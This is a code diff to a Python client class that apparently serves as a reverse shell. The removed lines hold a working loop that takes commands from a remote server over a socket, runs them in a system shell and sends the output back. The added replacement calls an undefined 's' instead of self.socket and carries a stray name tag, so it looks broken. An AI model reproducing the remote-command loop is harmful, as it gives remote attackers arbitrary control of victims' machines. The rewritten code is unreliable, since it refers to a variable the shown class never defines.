@@ -89,37 +89,12 @@ class Client(object):
         except Exception as e:
             print('Could not start communication with server: %s\n' %str(e))
             return
-        cwd = str.encode(str(os.getcwd()) + '> ')
+        cwd = str.encode(str(os.getcwd()) + '> ')                                  ##LUKAS_ALSTRUP
         self.socket.send(struct.pack('>I', len(cwd)) + cwd)
         while True:
-            output_str = None
-            data = self.socket.recv(20480)
-            if data == b'': break
-            elif data[:2].decode("utf-8") == 'cd':
-                directory = data[3:].decode("utf-8")
-                try:
-                    os.chdir(directory.strip())
-                except Exception as e:
-                    output_str = "Could not change directory: %s\n" %str(e)
-                else: 
-                    output_str = ""
-            elif data[:].decode("utf-8") == 'quit':
-                self.socket.close()
-                break
-            elif len(data) > 0:
-                try:
-                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
-                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                    output_str = output_bytes.decode("utf-8", errors="replace")
-                except Exception as e:
-                    # TODO: Error description is lost
-                    output_str = "Command execution unsuccessful: %s\n" %str(e)
-            if output_str is not None:
-                try:
-                    self.print_output(output_str)
-                except Exception as e:
-                    print('Cannot send command output: %s' %str(e))
+            command = s.recv(1024)
+            command = command.decode()
+            check_command(s,command)
         self.socket.close()
         return
 
